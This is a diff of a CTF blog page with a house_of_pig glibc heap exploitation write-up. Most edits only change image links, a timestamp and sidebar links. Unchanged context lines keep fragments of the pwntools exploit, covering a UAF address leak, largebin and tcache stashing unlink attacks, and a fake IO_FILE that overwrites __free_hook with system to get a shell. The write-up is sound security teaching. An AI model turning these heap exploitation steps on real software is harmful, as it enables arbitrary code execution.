@@ -102,12 +102,12 @@ Arashimuのblog = CTFer</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclwuom7cj20zk0m8dvn.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicitht3xtj20zk0m8k5v.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipewkhf1zj20zk0m81kx.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclg5ms2rj20zk0m8u0x.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclga70tsj20zk0m84mr.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giph4lm9i7j20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipesng5oej20zk0m87d4.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipewr8iypj20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeudstjqj20zk0m8k3r.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclh0m9pdj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeu1usa7j20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclgrvbd6j20zk0m8qv5.jpg"></li>
         </ul>
       </div>
     </header>
@@ -235,21 +235,21 @@ fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base&gt;=_IO_blen (fp)
 <h3 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析"></a> 题目分析</h3>
 <p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vemliYWk2NjYvYXJ0aWNsZS9kZXRhaWxzLzEyMDEyMTg5MQ==">各个结构体的分析可以参考这个博客</span></p>
 <p>show分析<br />
-<img data-src="/images/house_of_pigs/16.jpg" alt="" /><br />
+<img data-src="/images/house_of_pig/16.jpg" alt="" /><br />
 edit分析<br />
-<img data-src="/images/house_of_pigs/17.jpg" alt="" /><br />
+<img data-src="/images/house_of_pig/17.jpg" alt="" /><br />
 delete分析<br />
-<img data-src="/images/house_of_pigs/18.jpg" alt="" /><br />
+<img data-src="/images/house_of_pig/18.jpg" alt="" /><br />
 角色转换分析</p>
 <ul>
 <li>保存角色
 <ul>
-<li><img data-src="/images/house_of_pigs/19.jpg" alt="" /></li>
+<li><img data-src="/images/house_of_pig/19.jpg" alt="" /></li>
 </ul>
 </li>
 <li>恢复角色
 <ul>
-<li><img data-src="/images/house_of_pigs/20.jpg" alt="" /></li>
+<li><img data-src="/images/house_of_pig/20.jpg" alt="" /></li>
 </ul>
 </li>
 </ul>
@@ -604,7 +604,7 @@ Add(<span class="hljs-number">0xe0</span>, <span class="hljs-string">&#x27;B&#x2
 Change(<span class="hljs-number">1</span>)
 Add(<span class="hljs-number">0x430</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x158</span>) <span class="hljs-comment"># A16，此时A8+0xf0(0xa0)从unsorted bin进入small bin</span>
 </code></pre>
-<p><img data-src="/images/house_of_pigs/1.jpg" alt="" /></p>
+<p><img data-src="/images/house_of_pig/1.jpg" alt="" /></p>
 <h3 id="part2-leak-libc_base-and-heap_base"><a class="markdownIt-Anchor" href="#part2-leak-libc_base-and-heap_base"></a> part2 leak libc_base and heap_base</h3>
 <p>泄露libc和heap的基地址</p>
 <pre class="highlight"><code class="python">Change(<span class="hljs-number">2</span>)
@@ -627,8 +627,8 @@ lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)
 Edit(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>*p64(libc_base+<span class="hljs-number">0x1ebfe0</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># recover</span>
 </code></pre>
 <p>创建一个可以放入largebin中的chunk(A16)，然后利用UAF泄露地址，可以本地先算偏移<br />
-<img data-src="/images/house_of_pigs/2.jpg" alt="" /><br />
-<img data-src="/images/house_of_pigs/3.jpg" alt="" /></p>
+<img data-src="/images/house_of_pig/2.jpg" alt="" /><br />
+<img data-src="/images/house_of_pig/3.jpg" alt="" /></p>
 <h3 id="part3-first-largebin_attack"><a class="markdownIt-Anchor" href="#part3-first-largebin_attack"></a> part3 first largebin_attack</h3>
 <p>往<code>__free_hook</code>相关的地址上写入堆上的地址</p>
 <pre class="highlight"><code class="python">Add(<span class="hljs-number">0x430</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x158</span>) <span class="hljs-comment"># A17=A16   </span>
@@ -681,7 +681,7 @@ Add(<span class="hljs-number">0xa0</span>, <span class="hljs-string">&#x27;C&#x2
 Change(<span class="hljs-number">2</span>)
 Edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>*p64(heap_base+<span class="hljs-number">0x13e80</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># recover</span>
 </code></pre>
-<p><img data-src="/images/house_of_pigs/8.jpg" alt="" /><br />
+<p><img data-src="/images/house_of_pig/8.jpg" alt="" /><br />
 可以看到<code>_IO_list_all-&gt;B8</code></p>
 <h3 id="part5-tcache_stashing_unlink_attack"><a class="markdownIt-Anchor" href="#part5-tcache_stashing_unlink_attack"></a> part5 tcache_stashing_unlink_attack</h3>
 <pre class="highlight"><code class="python">Change(<span class="hljs-number">1</span>)
@@ -690,18 +690,18 @@ payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-numb
 Edit(<span class="hljs-number">8</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)
 此时smallbin中的布局，`free_hook-<span class="hljs-number">0x20</span>`被成功写入到smallbin中
 </code></pre>
-<p><img data-src="/images/house_of_pigs/9.jpg" alt="" /></p>
+<p><img data-src="/images/house_of_pig/9.jpg" alt="" /></p>
 <pre class="highlight"><code class="python">Change(<span class="hljs-number">3</span>)
 payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span> + p64(heap_base+<span class="hljs-number">0x147c0</span>)
 payload = payload.ljust(<span class="hljs-number">0x158</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)
 Add(<span class="hljs-number">0x440</span>, payload) <span class="hljs-comment"># C3 change fake FILE _chain，申请出B8</span>
 </code></pre>
-<p><img data-src="/images/house_of_pigs/10.jpg" alt="" /><br />
+<p><img data-src="/images/house_of_pig/10.jpg" alt="" /><br />
 先在unsortedbin中找，大小不合适，把A19+0xb0加入smallbin中，然后把B8拿来使用，即C3=B8，同时在B8处伪IO_FILE的<code>_chain</code>字段为<code>A19+0xb0</code><br />
 <img data-src="/images/house_of_pigs/22.jpg" alt="" /></p>
 <pre class="highlight"><code class="python">Add(<span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;C&#x27;</span>*<span class="hljs-number">0x28</span>) <span class="hljs-comment"># C4 triger tcache_stashing_unlink_attack, put the chunk of __free_hook into tcache</span>
 </code></pre>
-<p><img data-src="/images/house_of_pigs/11.jpg" alt="" /><br />
+<p><img data-src="/images/house_of_pig/11.jpg" alt="" /><br />
 此时<code>__free_hook-0x10</code>进入了<code>tcache</code>中，注意由于这里是用角色3申请的，<code>0x90</code>大小的会把smallbin中的<code>A0+0xa0</code>拿来使用，而后面的Gift申请的<code>0xE8</code>大小的则是从<code>A19+0xb0</code>拿出<code>0xf0</code>取分配。而后面就是把伪造的IO_FILE的内容写到``A19+0xb0`上了</p>
 <h3 id="part6-io_file-attach"><a class="markdownIt-Anchor" href="#part6-io_file-attach"></a> part6 IO_FILE attach</h3>
 <p>现在就是要从tcache中拿出<code>__free_hook-0x10</code>，但没有<code>malloc</code>。<br />
@@ -714,7 +714,7 @@ Add(<span class="hljs-number">0x440</span>, payload) <span class="hljs-comment">
 </ul>
 <pre class="highlight"><code class="python">IO_str_vtable = libc_base + <span class="hljs-number">0x1ED560</span>  
 </code></pre>
-<p><img data-src="/images/house_of_pigs/12.jpg" alt="" /></p>
+<p><img data-src="/images/house_of_pig/12.jpg" alt="" /></p>
 <pre class="highlight"><code class="python">system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]
 fake_IO_FILE = <span class="hljs-number">2</span>*p64(<span class="hljs-number">0</span>)
 fake_IO_FILE += p64(<span class="hljs-number">1</span>)                                  <span class="hljs-comment">#change _IO_write_base = 1</span>
@@ -733,7 +733,7 @@ sa(<span class="hljs-string">&#x27;Gift:&#x27;</span>, payload) <span class="hlj
 Menu(<span class="hljs-number">5</span>)
 sla(<span class="hljs-string">&#x27;user:\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment">#触发exit(-1)</span>
 </code></pre>
-<p><img data-src="/images/house_of_pigs/23.jpg" alt="" /><br />
+<p><img data-src="/images/house_of_pig/23.jpg" alt="" /><br />
 <img data-src="/images/house_of_pig/13.jpg" alt="" /><br />
 而<code>_IO_buf_end</code>和<code>_IO_buf_base</code>的计算，再看看利用链</p>
 <pre class="highlight"><code class="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span>
@@ -758,10 +758,10 @@ __free_hook     :system_addr
 __free_hook-0x10:/bin/sh\x00  system_addr
 __free_hook     :system_addr  
 </code></pre>
-<p><img data-src="/images/house_of_pigs/15.jpg" alt="" /><br />
+<p><img data-src="/images/house_of_pig/15.jpg" alt="" /><br />
 和我们的预期一样，这里调试，可以在<code>_IO_str_overflow</code>下断点，运行到这里后再在<code>free</code>下断点</p>
 <p>那么<code>old_blen=0x18</code>，<code>old=buf=C5+0xE8-0x18=C5+d0</code>，根据偏移得到地址<br />
-<img data-src="/images/house_of_pigs/14.jpg" alt="" /><br />
+<img data-src="/images/house_of_pig/14.jpg" alt="" /><br />
 这里虽然<code>old_len=0x18&lt;0x1e</code>，但堆的申请都是向上取，所以可以申请到<br />
 最后<code>free(old_buf)</code>，而<code>old_buf</code>也恰好保存了<code>/bin/sh</code>，即可getshell</p>
 
@@ -778,7 +778,7 @@ __free_hook     :system_addr
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2023-04-16 13:50:35" itemprop="dateModified" datetime="2023-04-16T13:50:35+08:00">2023-04-16</time>
+    <time title="Modified: 2023-04-16 14:02:03" itemprop="dateModified" datetime="2023-04-16T14:02:03+08:00">2023-04-16</time>
   </span>
 </div>
 
@@ -833,7 +833,7 @@ __free_hook     :system_addr
     <div class="item left">
       
 
-  <a href="/2023/04/16/tcache-stashing-unlink-attack/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicljgocqbj20zk0m8e81.jpg" title="tcache_stashing_unlink_attack">
+  <a href="/2023/04/16/tcache-stashing-unlink-attack/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclga70tsj20zk0m84mr.jpg" title="tcache_stashing_unlink_attack">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>tcache_stashing_unlink_attack</h3>
@@ -940,6 +940,24 @@ __free_hook     :system_addr
 <div class="breadcrumb">
 </div>
 
+    <span><a href="/2023/03/26/2023-3-PWHHUB/" title="2023_3_PWHHUB">2023_3_PWHHUB</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/07/Lucky-7-%E4%BA%8C%E5%85%83%E9%9D%9E%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B%E7%BB%84/" title="Lucky 7 二元非线性同余方程组">Lucky 7 二元非线性同余方程组</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
     <span><a href="/2022/09/29/Paillier%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/" title="Paillier同态加密">Paillier同态加密</a></span>
   </li>
 
@@ -949,7 +967,7 @@ __free_hook     :system_addr
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/05/08/hello-world/" title="Hello World">Hello World</a></span>
+    <span><a href="/2022/09/23/BUU-Crypto/" title="BUU_Crypto">BUU_Crypto</a></span>
   </li>
 
       
@@ -958,7 +976,7 @@ __free_hook     :system_addr
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/05/17/Misc1/" title="Misc1">Misc1</a></span>
+    <span><a href="/2022/10/29/2022-hackgame%E5%A4%8D%E7%8E%B0/" title="2022-hackgame复现">2022-hackgame复现</a></span>
   </li>
 
       
@@ -967,25 +985,7 @@ __free_hook     :system_addr
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/09/03/i%E6%98%A5%E7%A7%8B%E5%8B%87%E8%80%85%E4%B9%8B%E5%B7%85Crypto%E5%AD%A6%E4%B9%A0/" title="i春秋勇者之巅Crypto学习">i春秋勇者之巅Crypto学习</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/03/08/SROP/" title="SROP">SROP</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/04/16/house-of-pig/" title="house_of_pig">house_of_pig</a></span>
+    <span><a href="/2023/02/21/house-of-botcake/" title="house_of_botcake">house_of_botcake</a></span>
   </li>
 
       
@@ -1003,7 +1003,7 @@ __free_hook     :system_addr
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/02/21/idek2022%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" title="idek2022部分复现">idek2022部分复现</a></span>
+    <span><a href="/2022/09/13/Crypto%E5%A4%8D%E7%8E%B01/" title="Crypto复现1">Crypto复现1</a></span>
   </li>
 
       
@@ -1012,7 +1012,7 @@ __free_hook     :system_addr
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/07/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="sql注入学习">sql注入学习</a></span>
+    <span><a href="/2022/08/24/%E9%95%BF%E5%9F%8E%E6%9D%AFCrypto/" title="长城杯Crypto">长城杯Crypto</a></span>
   </li>
 
       
@@ -1021,7 +1021,7 @@ __free_hook     :system_addr
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/12/11/reverse%E6%B3%9B%E5%81%9A1/" title="reverse泛做1">reverse泛做1</a></span>
+    <span><a href="/2023/04/16/tcache-stashing-unlink-attack/" title="tcache_stashing_unlink_attack">tcache_stashing_unlink_attack</a></span>
   </li>
 
   </ul>
